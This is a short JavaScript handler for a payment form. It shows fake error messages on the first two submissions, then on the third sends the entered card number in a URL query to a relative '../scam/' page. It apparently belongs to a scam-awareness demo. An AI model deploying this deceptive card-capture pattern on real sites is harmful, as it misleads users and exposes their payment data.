let errorCount = 0;
const form = document.getElementById("payment-form");
const errorMessage = document.getElementById("error-message");

form.addEventListener("submit", function (e) {
    e.preventDefault();
    errorCount++;

    if (errorCount >= 3) {
        const card = encodeURIComponent(document.getElementById("card-number").value);
        window.location.href = `../scam/?card=${card}`;
    } else {
        errorMessage.style.display = "block";
    }
});